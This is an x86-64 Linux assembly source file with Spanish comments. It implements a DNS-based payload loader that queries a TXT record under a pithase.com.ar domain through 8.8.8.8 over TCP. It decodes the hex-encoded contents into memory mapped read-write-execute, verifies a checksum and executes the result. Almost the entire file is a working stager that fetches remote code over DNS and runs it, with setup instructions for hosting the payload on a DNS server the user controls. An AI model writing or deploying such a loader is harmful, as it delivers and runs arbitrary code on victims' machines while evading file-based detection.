```nasm
;===========================================================================================================================================================
; Archivo      : dns-payload-loader-full-dynamic-checksum.asm
; Creado       : 19/03/2025
; Modificado   : 19/03/2025
; Autor        : Gastón M. González
; Plataforma   : Linux
; Arquitectura : x86-64
;===========================================================================================================================================================
; Descripción  : Loader de payload vía DNS, TOTALMENTE DINÁMICO, capaz de manejar payloads de tamaño variable sin límites
;                predefinidos, con verificación de integridad mediante checksum.
;
;                Descarga un payload extendido con información adicional que permite verificar su integridad:
;                • Tamaño del payload de 3 bytes (little endian)
;                • Checksum aditivo global de 3 bytes (little endian) para verificar la integridad del payload.
;
;                El archivo que se genera está en formato hexadecimal, estructurado de la siguiente manera:
;                ┌────────────────────────────┬────────────────────────────┬────────────────────────┐
;                │    Tamaño (3 bytes, LE)    │      Payload original      │ Checksum (3 bytes, LE) │
;                └────────────────────────────┴────────────────────────────┴────────────────────────┘
;                La información adicional es incorporada utilizando el script payloadextend.sh
;
;                Para este ejemplo, se genero el payload extendido ejecutando: ./payloadextend.sh --checksum --dns <archivo-payload>
;                Ejemplo: ./payloadextend.sh --checksum --dns payload4KBlarger.bin
;
;                El archivo TXT generado se debe copiar tal cual está, en el campo Contenido del registro TXT
;
;                Explicación detallada en:
;                • https://github.com/Pithase/asm-payloads-loaders/blob/main/bin/README.md
;                • https://github.com/Pithase/asm-payloads-loaders/blob/main/bin/payloadextend.sh
;
; Compilar     : nasm -f elf64 dns-payload-loader-full-dynamic-checksum.asm -o dns-payload-loader-full-dynamic-checksum.o
; Linkear      : ld dns-payload-loader-full-dynamic-checksum.o -o dns-payload-loader-full-dynamic-checksum
; Ejecutar     : ./dns-payload-loader-full-dynamic-checksum
; Ejecutar     : ./dns-payload-loader-full-dynamic-checksum ; echo "Código de salida:" $?
;===========================================================================================================================================================
; Instrucciones para configurar el registro TXT en servidores DNS controlados
;===========================================================================================================================================================
; Para ejecutar este código haciendo uso de un servidor DNS que controles, aplica los siguientes cambios:
;
; • Reemplazar estas líneas, por el nombre del registro TXT. Los números que están al inicio representan la longitud de la cadena que está a continuación.
;   En caso de ser un .com, la cuarta línea se eliminaría.
;
;   db 26, 'p','a','y','l','o','a','d','4','k','b','l','a','r','g','e','r','-','e','x','t','-','c','-','h','e','x'
;   db 7, 'p','i','t','h','a','s','e'
;   db 3, 'c','o','m'
;   db 2, 'a','r'
;   db 0
;
; • Reemplazar el tamaño del mensaje, para esto se deben contabilizar cada uno de los elementos que están después de db, separados por una como o se
;   encuentran solos en una línea.
;
;   db 0x00, 0x3B  ; tamaño del mensaje DNS: 59 bytes
;===========================================================================================================================================================
; Licencia MIT:
; Este código es de uso libre bajo los términos de la Licencia MIT.
; Puedes usarlo, modificarlo y redistribuirlo, siempre que incluyas esta nota de atribución.
; NO HAY GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA.
; Licencia completa en: https://github.com/Pithase/asm-payloads-loaders/blob/main/LICENSE
;===========================================================================================================================================================

section .data
    ;==========================================================================================================================================
    ; Configuración de la consulta DNS para obtener el registro TXT
    ;==========================================================================================================================================
    query:
        db 0x00, 0x3B                    ; tamaño del mensaje DNS (59 bytes, incluyendo cabecera, pregunta y sin tener en cuenta esta línea)
        db 0x12, 0x34                    ; ID de la consulta (valor arbitrario)
        db 0x01, 0x00                    ; Flags: 0x0100 -> Recursion Desired (RD) activado
        db 0x00, 0x01                    ; QDCOUNT: 1 (solo una pregunta en la consulta)
        db 0x00, 0x00                    ; ANCOUNT: 0 (aún no hay respuestas)
        db 0x00, 0x00                    ; NSCOUNT: 0 (sin registros de autoridad)
        db 0x00, 0x00                    ; ARCOUNT: 0 (sin registros adicionales)

        ; Nombre del dominio solicitado (nombre codificado según la estructura de DNS)
        db 26, 'p','a','y','l','o','a','d','4','k','b','l','a','r','g','e','r','-','e','x','t','-','c','-','h','e','x'
        db 7, 'p','i','t','h','a','s','e'
        db 3, 'c','o','m'
        db 2, 'a','r'
        db 0                             ; fin del nombre de dominio

        db 0x00, 0x10                    ; QTYPE = 0x0010 (Tipo TXT)
        db 0x00, 0x01                    ; QCLASS = 0x0001 (Clase IN - Internet)

    query_len equ $ - query              ; Calcula automáticamente el tamaño total de la consulta

    dns_port          equ 0x3500         ; puerto 53 en little endian
    dns_server_ip     equ 0x08080808     ; dirección IP 8.8.8.8 (Google Public DNS) en little endian

section .bss
    buffer            resb 512           ; buffer para almacenar bloques de 512 bytes de la respuesta DNS
    buffer_to_mem     resb 512           ; buffer para almacenar los datos TXT "limpios" (sin campo de longitud)
    tcp_len_buf       resb 2             ; buffer para almacenar los 2 bytes de longitud del mensaje DNS (TCP)
    payload_size      resq 1             ; tamaño del payload recibido (3 bytes extraídos del inicio del TXT)
    expected_checksum resq 1             ; checksum esperado (últimos 3 bytes del payload)
    sockfd            resq 1             ; descriptor del socket para la conexión DNS
    exec_mem          resq 1             ; dirección de memoria reservada con 'mmap' (para almacenar el payload)
    exec_mem_offset   resq 1             ; offset dentro de 'exec_mem', usado para ir almacenando los bytes convertidos
    dns_block_len     resb 1             ; cantidad de bytes restantes por procesar del último bloque leído

section .text
    global _start

_start:
    ;==========================================================================================================================================
    ; 1. Crea un socket (socket(AF_INET, SOCK_STREAM, 0))
    ;==========================================================================================================================================
    mov rax, 41                          ; syscall: socket()
    mov rdi, 2                           ; AF_INET -> IPv4
    mov rsi, 1                           ; SOCK_STREAM -> TCP (orientado a conexión)
    mov rdx, 0                           ; protocolo predeterminado (IPPROTO_TCP para SOCK_STREAM)
    syscall

    test rax, rax                        ; verifica si se creó el socket con éxito (retorna -1 en caso de error)
    js socket_error                      ; si fue sin éxito (rax < 0), salta a manejo de error
    mov [sockfd], rax                    ; guarda el descriptor del socket en la variable sockfd

    ;==========================================================================================================================================
    ; 2. Configura sockaddr_in
    ;==========================================================================================================================================
    sub rsp, 16                          ; reserva espacio en la pila para la estructura sockaddr_in (16 bytes)
    mov word [rsp], 2                    ; sin_family = AF_INET (Protocolo IPv4)
    mov word [rsp+2], dns_port           ; puerto 53 del servidor en little endian
    mov dword [rsp+4], dns_server_ip     ; IP del servidor en little endian
    mov qword [rsp+8], 0                 ; sin_zero = 0 (relleno para alinear la estructura a 16 bytes)

    ;==========================================================================================================================================
    ; 3. Conecta al servidor (connect)
    ;==========================================================================================================================================
    mov rax, 42                          ; syscall: connect()
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    mov rsi, rsp                         ; puntero a la estructura sockaddr_in (dirección del servidor)
    mov rdx, 16                          ; tamaño de la estructura sockaddr_in (16 bytes para IPv4)
    syscall

    add rsp, 16                          ; limpia la pila después de usar sockaddr_in

    test rax, rax                        ; verifica si connect fue exitosa (retorna -1 en caso de error)
    js connect_error                     ; si fue sin éxito (RAX < 0), salta a manejo de error

    ;==========================================================================================================================================
    ; 4. Envía la consulta DNS
    ;==========================================================================================================================================
    mov rax, 1                           ; syscall: sys_write -> escribe datos en un descriptor de archivo (socket en este caso)
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    mov rsi, query                       ; puntero al buffer con la solicitud DNS
    mov rdx, query_len                   ; longitud de la solicitud DNS
    syscall

    test rax, rax                        ; verifica si sys_write fue exitoso (RAX contiene bytes escritos o -1 en caso de error)
    js dns_query_error                   ; si hubo error (RAX < 0), salta al manejo de error

    ;==========================================================================================================================================
    ; 5. Lee los 2 bytes iniciales que indican la longitud del mensaje DNS
    ;==========================================================================================================================================
    mov rax, 0                           ; syscall: sys_read -> lee datos desde el socket
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    mov rsi, tcp_len_buf                 ; dirección donde almacenar los 2 bytes de longitud del mensaje DNS
    mov rdx, 2                           ; intenta leer exactamente 2 bytes
    syscall

    test rax, rax                        ; verifica si sys_read fue exitoso (RAX contiene bytes leídos o -1 en caso de error)
    js dns_read_error                    ; si hubo error, salta al manejo de error
    cmp rax, 2                           ; verifica que se hayan leído exactamente 2 bytes
    jne dns_read_error                   ; si no se leyeron 2 bytes, salta a manejo de error

    ;==========================================================================================================================================
    ; 6. Convierte la longitud del mensaje DNS de big-endian a little-endian
    ;==========================================================================================================================================
    mov ax, word [tcp_len_buf]           ; carga los 2 bytes de longitud del mensaje DNS en AX (big-endian)
    xchg al, ah                          ; intercambia los bytes para convertir a little-endian
    movzx r14, ax                        ; expande AX a 64 bits en R14

    cmp r14, 12                          ; verifica que la longitud del mensaje sea al menos 12 bytes
    jl dns_msg_size_error                ; si es menor, salta al manejo de error

    ;==========================================================================================================================================
    ; 7. Lee el mensaje DNS en bloques de 512 bytes o fracción (puede ser el último bloque)
    ;==========================================================================================================================================
    mov byte [dns_block_len], 0          ; inicializa la variable que controla datos pendientes del último bloque leído
    xor r12, r12                         ; inicializa R12 (indica si ya se reservó memoria ejecutable)

read_dns_loop:
    xor r8, r8                           ; inicializa el contador de reintentos
    mov rax, r14                         ; asigna la longitud total del mensaje DNS
    cmp rax, 0                           ; verifica si hay más datos por leer
    jg read_next_block                   ; si quedan bytes, continúa la lectura
    jmp checksum_extract                 ; si no hay más bytes, extrae el checksum y finaliza

read_next_block:
    mov rdx, rax                         ; cantidad de bytes que quedan por leer
    cmp rdx, 512                         ; compara con 512 (tamaño de bloque)
    jbe read_chunk                       ; si es menor o igual a 512, leer lo que queda
    mov rdx, 512                         ; si es mayor a 512, leer solo 512 bytes

read_chunk:
    sub r14, rdx                         ; reduce el contador de bytes restantes
    mov rdi, [sockfd]                    ; descriptor del socket previamente creado
    mov rsi, buffer                      ; dirección del buffer de lectura temporal
    mov rbx, rdx                         ; almacena la cantidad de bytes que se deben leer
    xor rcx, rcx                         ; inicializa el contador de bytes leídos

retry_read:
    mov rax, 0                           ; syscall: sys_read
    mov rdx, rbx                         ; cantidad de bytes aún pendientes de leer
    syscall

    test rax, rax                        ; verifica si hubo error en la lectura
    js dns_read_error                    ; si hubo error, salta al manejo de error

    cmp rax, 0                           ; verifica si no se leyeron bytes (sin progreso)
    je no_progress_read

    add rcx, rax                         ; acumula en RCX la cantidad total leída en este bloque
    add rsi, rax                         ; avanza el puntero en el buffer (RSI)
    sub rbx, rax                         ; resta la cantidad de bytes leídos de los pendientes

    cmp rbx, 0                           ; verifica si ya se completó la lectura del bloque
    jne retry_read                       ; si no, vuelve a intentar leer los bytes restantes

    cmp rcx, 2
    jge process_dns_data                 ; Si se leyeron 2 o más bytes, continúa con el procesamiento
    jmp checksum_extract                 ; Si se leyeron menos de 2 bytes, pasa a la extracción del checksum

no_progress_read:
    inc r8                               ; incrementa el contador de reintentos
    cmp r8, 5                            ; compara con el máximo permitido de reintentos (5) por bloque
    jge dns_read_error                   ; si se excede, salta al manejo de error
    jmp retry_read                       ; vuelve a intentar la lectura

process_dns_data:
    call parsea_dns_read                 ; parsea el bloque recibido y almacena los datos TXT
    jmp read_dns_loop                    ; vuelve al inicio del bucle para leer el siguiente bloque

    ;==========================================================================================================================================
    ; 8. Extrae el cheksum (últimos 3 bytes del payload total leído)
    ;==========================================================================================================================================
checksum_extract:
    mov rbx, [payload_size]              ; se asigna el tamaño total del payload recibido
    sub rbx, 3                           ; excluye los últimos 3 bytes que corresponden al checksum

    mov rsi, [exec_mem]                  ; se carga la dirección base de la memoria reservada
    add rsi, rbx                         ; se posiciona en los últimos 3 bytes (inicio del checksum en memoria)

    ; Extrae los 3 bytes del checksum y los almacena en registros de 32 bits para su procesamiento
    movzx eax, byte [rsi]                ; carga el primer byte (LSB)
    movzx edx, byte [rsi+1]              ; carga el segundo byte
    movzx ecx, byte [rsi+2]              ; carga el tercer byte (MSB)

    ; Construye el checksum de 3 bytes en R13d
    mov r13d, eax                        ; inicializa R13d con el primer byte (más bajo)
    shl edx, 8                           ; desplaza el segundo byte 8 bits a la izquierda
    add r13d, edx                        ; suma el segundo byte a R13d
    shl ecx, 16                          ; desplaza el tercer byte 16 bits a la izquierda
    add r13d, ecx                        ; suma el tercer byte a R13d -> checksum completo en R13d

    mov [expected_checksum], r13d        ; guarda el checksum extraído

    ;==========================================================================================================================================
    ; 9. Calcula el checksum aditivo sobre los datos almacenados en exec_mem (payload recibido)
    ;==========================================================================================================================================
    xor rax, rax                         ; inicializa el acumulador de checksum en 0
    mov rcx, [payload_size]              ; carga en RCX el tamaño total del payload recibido
    sub rcx, 3                           ; se resta el tamaño del checksum (3 bytes) para obtener el tamaño real del payload
    mov rsi, [exec_mem]                  ; RSI apunta al inicio del payload en la memoria reservada

checksum_loop:
    cmp rcx, 0                           ; verifica si quedan bytes por procesar
    je checksum_done                     ; si no quedan bytes, termina el cálculo del checksum
    movzx edx, byte [rsi]                ; carga el byte actual en EDX
    add rax, rdx                         ; suma el byte actual al acumulador de checksum
    inc rsi                              ; avanza al siguiente byte en memoria
    dec rcx                              ; decrementa el contador de bytes restantes
    jmp checksum_loop                    ; repite el proceso hasta que RCX llegue a 0

checksum_done:
    cmp rax, [expected_checksum]         ; compara el checksum calculado con el esperado
    jne checksum_error                   ; si no coinciden, salta a la rutina de error

    ;==========================================================================================================================================
    ; 10. Cierra el socket
    ;==========================================================================================================================================
    mov rax, 3                           ; syscall: close -> cierra el socket abierto
    mov rdi, [sockfd]                    ; carga el descriptor del socket en RDI
    syscall

    ;==========================================================================================================================================
    ; 11. Ejecuta el payload
    ;==========================================================================================================================================
    call qword [exec_mem]                ; salta a la dirección almacenada en exec_mem y ejecuta el payload

    ;==========================================================================================================================================
    ; 12. Salida: Se alcanza solo si el payload retorna
    ;==========================================================================================================================================
    xor rdi, rdi                         ; establece el código de salida en 0 (indica éxito)
    jmp exit                             ; salta a la rutina de salida del programa

    ;==========================================================================================================================================
    ; 13. Manejo de errores: Salida con código distinto según el error
    ;     Se incluye la liberación de recursos (cierre del socket) antes de salir
    ;==========================================================================================================================================
socket_error:
    mov rdi, 1                           ; error: No se pudo crear el socket
    jmp exit_error

connect_error:
    mov rdi, 2                           ; error: No se pudo conectar al servidor DNS
    jmp exit_error

dns_query_error:
    mov rdi, 3                           ; error: Falló el envío de la consulta DNS
    jmp exit_error

dns_read_error:
    mov rdi, 4                           ; error: No se pudo leer la longitud del mensaje DNS
    jmp exit_error

dns_msg_size_error:
    mov rdi, 5                           ; error: El tamaño del mensaje DNS es menor al mínimo requerido
    jmp exit_error

checksum_error:
    mov rdi, 6                           ; error: El checksum calculado y el esperado no coinciden
    jmp exit_error

mmap_error:
    mov rdi, 7                           ; error: Fallo en mmap al asignar memoria ejecutable
    jmp exit_error

exit_error:
    push rdi                             ; guarda el código de error en la pila (para restaurarlo después del cierre del socket)

    mov rax, [sockfd]                    ; obtiene el descriptor del socket
    cmp rax, 0                           ; verifica si el socket fue abierto
    je exit                              ; si no está abierto, ir directamente a exit

    mov rdi, rax                         ; carga el descriptor del socket en RDI para cerrarlo
    mov rax, 3                           ; syscall: close (cierra el socket abierto)
    syscall

    pop rdi                              ; restaura el código de error antes de salir

exit:
    mov rax, 60                          ; syscall: exit
    syscall                              ; finaliza el proceso con el código en RDI


    ;==========================================================================================================================================
    ; 14. Calcula el tamaño a mapear, alineándolo al siguiente múltiplo de 4096 (tamaño de página)
    ;==========================================================================================================================================
reserve_memory:
    mov r13, [payload_size]              ; carga en R13 el tamaño total del payload + checksum
    mov rax, r13                         ; copia ese tamaño en RAX para su ajuste
    add rax, 4095                        ; suma 4095 para garantizar que cualquier tamaño se redondee al siguiente múltiplo de 4096
    and rax, 0xFFFFFFFFFFFFF000          ; fuerza a que RAX quede alineado a 4096 bytes

    ;==========================================================================================================================================
    ; Reserva memoria ejecutable con mmap
    ;==========================================================================================================================================
    mov rdi, 0                           ; dirección de memoria sugerida (0 = el sistema elige)
    mov rsi, rax                         ; tamaño a mapear (múltiplo de 4096)
    mov rdx, 7                           ; protecciones (RWX): PROT_READ | PROT_WRITE | PROT_EXEC
    mov r10, 0x22                        ; flags: MAP_PRIVATE | MAP_ANONYMOUS (memoria privada y no asociada a un archivo)
    mov r8, -1                           ; descriptor de archivo (-1, porque MAP_ANONYMOUS no usa archivos)
    mov r9, 0                            ; offset (debe ser 0 con MAP_ANONYMOUS)
    mov rax, 9                           ; syscall: mmap (mapea memoria)
    syscall

    test rax, rax                        ; verifica si mmap falló (resultado negativo indica error)
    js mmap_error                        ; si falló, salta a manejo de errores

    mov [exec_mem], rax                  ; guarda la dirección base de la memoria asignada
    mov r12, 1                           ; marca que la memoria ya fue reservada para evitar asignaciones duplicadas
    mov [exec_mem_offset], rax           ; guarda la dirección base de la memoria asignada
    ret


    ;==========================================================================================================================================
    ; 15. Parsea el mensaje DNS y extrae el contenido del registro TXT
    ;==========================================================================================================================================
parsea_dns_read:
    lea rsi, [buffer]                    ; RSI apunta al inicio del buffer con la respuesta DNS

    cmp r12, 0                           ; verifica si la memoria para el payload ya ha sido reservada
    jne .continue_parsing                ; si ya se reservó, omite la extracción de la cabecera y pasa a parsear datos

    add rsi, 12                          ; avanza 12 bytes para saltar la cabecera DNS

.skip_question:                          ; recorre la sección de pregunta hasta encontrar el byte 0 que indica el final del nombre de dominio
    mov al, byte [rsi]                   ; lee un byte (parte del nombre de dominio codificado en etiquetas)
    cmp al, 0                            ; ¿es el byte final de la sección de pregunta?
    je .end_skip_question                ; si es 0, termina el proceso de salto
    inc rsi                              ; si no, avanza al siguiente byte
    jmp .skip_question                   ; repite hasta encontrar el byte 0

.end_skip_question:
    inc rsi                              ; salta el byte nulo (0) que marca el final del dominio
    add rsi, 4                           ; salta los campos QTYPE (2 bytes) y QCLASS (2 bytes), total 4 bytes

    mov rdi, rsi                         ; RDI apunta al inicio del registro de respuesta
    mov ax, word [rdi + 10]              ; carga los 2 bytes de RDLENGTH en formato big-endian
    xchg al, ah                          ; convierte a little-endian
    movzx r15, ax                        ; R15 almacena la cantidad de bytes de RDATA

    add rsi, 12                          ; salta la cabecera del registro de respuesta (12 bytes).
                                         ; RSI ahora apunta al inicio del RDATA (contenido del TXT record)

.continue_parsing:
    lea rdi, [buffer_to_mem]             ; RDI apunta al buffer donde se almacenará el TXT "limpio"
    xor rcx, rcx                         ; RCX = contador de bytes procesados en RDATA

    lea rbx, [buffer]                    ; RBX = inicio del buffer de respuesta
    add rbx, 512                         ; RBX apunta al final del bloque de 512 bytes
    sub rbx, rsi                         ; RBX = cantidad de bytes restantes en el buffer

    cmp byte[dns_block_len], 0           ; ¿queda una longitud parcial de un segmento TXT?
    je .parse_loop                       ; si no hay datos pendientes, continuar con el proceso normal
    mov dl, 254                          ; carga el valor máximo utilizado en un segmento TXT (254 bytes)
    sub dl, byte [dns_block_len]         ; ajusta la cantidad de datos restantes en el segmento

    jmp .copy_loop                       ; salta a copiar los datos restantes del segmento TXT anterior


    ;==========================================================================================================================================
    ; Iterar sobre los segmentos de RDATA (TXT record)
    ;==========================================================================================================================================
.parse_loop:
    cmp rcx, rbx                         ; compara los bytes procesados con el tamaño restante en el buffer
    jge .finish_txt                      ; si ya se procesó todo, finaliza el procesamiento del TXT
    mov dl, byte [rsi]                   ; carga la longitud del siguiente segmento TXT
    mov byte [dns_block_len], dl         ; almacena la longitud del segmento actual

    inc rsi                              ; avanza a la primera posición de datos del segmento
    dec r15                              ; decrementa la cantidad total de bytes restantes en RDATA
    inc rcx                              ; aumenta el contador de bytes procesados
    test dl, dl
    jz .parse_loop                       ; si la longitud es 0, salta al siguiente segmento

    cmp r12, 0                           ; verifica si la memoria para el payload ya fue reservada
    jne .copy_loop                       ; si ya se reservó, salta directamente a copiar los datos

    push rdi                             ; guarda en la pila los registros utilizados
    push rsi
    push rdx
    push rcx
    push rbx

    call payload_size_hex_to_int         ; convierte los primeros 6 caracteres del TXT en el tamaño del payload
    call reserve_memory                  ; reserva memoria ejecutable para almacenar el payload

    pop rbx                              ; restaura los registros
    pop rcx
    pop rdx
    pop rsi
    pop rdi

    add rsi, 6                           ; salta los 6 bytes del tamaño del payload
    sub r15, 6                           ; resta esos bytes del total de RDATA
    add rcx, 6                           ; ajusta el contador de bytes procesados
    mov dl, 0


    ;==========================================================================================================================================
    ; Copia de los datos del segmento TXT en 'buffer_to_mem'
    ;==========================================================================================================================================
.copy_loop:
    cmp dl, 0
    je .parse_loop                       ; si la cantidad de datos a copiar es 0, pasa al siguiente segmento
    mov al, byte [rsi]                   ; carga el byte actual del segmento TXT
    mov [rdi], al                        ; copia el byte en el buffer de salida
    inc rsi                              ; avanza al siguiente byte de la fuente
    dec r15                              ; reduce la cantidad de bytes restantes en RDATA
    inc rdi                              ; avanza en la memoria destino
    dec dl                               ; reduce la cantidad de bytes pendientes en el segmento actual
    inc rcx                              ; aumenta el contador de bytes procesados

    cmp rcx, rbx                         ; compara si ya se han procesado todos los bytes esperados
    jge .finish_txt                      ; si ya se procesaron todos, finaliza
    cmp r15,0                            ; verifica si ya se consumieron todos los bytes de RDATA
    je .finish_txt                       ; si sí, finaliza

    jmp .copy_loop                       ; continúa copiando


    ;==========================================================================================================================================
    ; Finalización del procesamiento de RDATA
    ;==========================================================================================================================================
.finish_txt:
    sub byte [dns_block_len], dl         ; ajusta la longitud restante en dns_block_len
    call convert_hex_to_byte             ; convierte la cadena hex a binario y almacena en memoria ejecutable
    ret


    ;==========================================================================================================================================
    ; 16. Convierte pares de caracteres hexadecimales a byte almacenada en 'buffer_to_mem' a bytes binarios en 'exec_mem'
    ;==========================================================================================================================================
convert_hex_to_byte:
    mov rcx, rdi                         ; RDI apunta al final de 'buffer_to_mem'

    lea rsi, [buffer_to_mem]             ; RSI apunta a la cadena hexadecimal "limpia"
    mov rdi, qword [exec_mem_offset]     ; RDI apunta al buffer de salida binaria en memoria ejecutable

    sub rcx, rsi                         ; calcula la longitud de 'buffer_to_mem' (cantidad de caracteres hexadecimales)

.convert_loop:
    mov dl, byte [rsi]                   ; lee el primer caracter del par hexadecimal
    cmp rcx, 0
    je .convert_done                     ; si RCX llega a 0, fin de la conversión
    call hex_to_int                      ; convierte el primer carácter (nibble alto)
    mov bl, dl                           ; guardar el nibble alto en BL
    mov dl, byte [rsi+1]                 ; lee el segundo caracter del par hexadecimal
    call hex_to_int                      ; convierte el segundo carácter (nibble bajo)
    shl bl, 4                            ; desplaza el nibble alto 4 bits a la izquierda
    or  bl, dl                           ; combina con el nibble bajo para formar el byte completo
    mov [rdi], bl                        ; escribir el byte convertido en la memoria ejecutable
    add rsi, 2                           ; avanzar 2 caracteres en 'buffer_to_mem'
    inc rdi                              ; avanzar 1 byte en 'exec_mem'
    sub rcx, 2                           ; resta la cantidad (2) de caracteres procesados
    jmp .convert_loop                    ; repetir hasta procesar toda la cadena hexadecimal

.convert_done:
    mov qword[exec_mem_offset], rdi      ; actualizar el puntero en 'exec_mem_offset'
    ret


    ;==========================================================================================================================================
    ; 17. Convierte un carácter ASCII (almacenado en AL) a su valor numérico (0-15)
    ;     Entrada: AL = carácter ('0'-'9', 'a'-'f')
    ;     Salida : AL = valor numérico (0-15)
    ;     Se asume que las letras siempre están en minúsculas
    ;==========================================================================================================================================
hex_to_int:
    cmp dl, '9'                          ; si es menor o igual a '9', es un dígito decimal
    jbe .digit_ok
    sub dl, 'a'                          ; 'a' (ASCII 97) -> 10 decimal
    add dl, 10
    ret

.digit_ok:
    sub dl, '0'                          ; convertir '0'-'9' en 0-9
    ret


    ;==========================================================================================================================================
    ; 18. Convierte los primeros 6 caracteres del TXT en el tamaño del payload en bytes
    ;     Entrada: RSI apunta al inicio del tamaño del payload en RDATA
    ;     Salida : '[payload_size]' contendrá el tamaño del payload en formato decimal (little-endian)
    ;     Se asume que todas las letras están en minúsculas
    ;==========================================================================================================================================
payload_size_hex_to_int:
    xor rax, rax                         ; inicializa resultado en 0
    mov rbx, 1                           ; multiplicador inicial = 1 (para byte menos significativo)
    mov rcx, 3                           ; 3 iteraciones (cada byte representado por 2 caracteres hexadecimales)

.payload_size_hex_to_int_loop:
    mov dl, byte [rsi]                   ; lee el primer caracter hexadecimal del par
    call hex_to_int                      ; convierte a valor numérico
    movzx r8, dl                         ; guarda nibble bajo en R8

    mov dl, byte [rsi+1]                 ; lee el segundo caracter hexadecimal del par
    call hex_to_int                      ; convierte a valor numérico
    movzx r9, dl                         ; guarda nibble bajo en R8

    shl r8, 4                            ; desplaza nibble bajo 4 bits a la izquierda
    or r8, r9                            ; combina con el nibble alto para formar el byte completo

    imul r8, rbx                         ; multiplicar el byte convertido por el factor correspondiente
    add rax, r8                          ; sumarlo al acumulador

    imul rbx, rbx, 256                   ; multiplicador *= 256 (para siguiente byte)
    add rsi, 2                           ; avanza 2 caracteres en RSI (1 byte procesado)
    loop .payload_size_hex_to_int_loop   ; decrementa RCX y repite hasta completar los 3 bytes

    mov [payload_size], rax              ; guarda tamaño del payload
    ret
```
